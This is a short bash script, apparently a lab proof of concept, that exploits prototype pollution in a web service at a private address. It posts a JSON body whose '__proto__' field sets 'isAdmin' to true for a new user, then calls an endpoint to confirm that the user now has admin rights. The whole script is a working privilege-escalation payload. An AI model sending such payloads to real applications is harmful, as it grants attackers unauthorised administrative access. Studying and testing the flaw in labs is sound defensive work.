#!/bin/bash

IP=10.5.5.102
PORT=8081

# Create User
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{ "__proto__" : { "isAdmin" : true }, "userId" : 1337, "name" : "User 1" }' \
  http://$IP:$PORT/set

echo ""

# Verify admin
curl -X GET \
  http://$IP:$PORT/isAdmin/1337
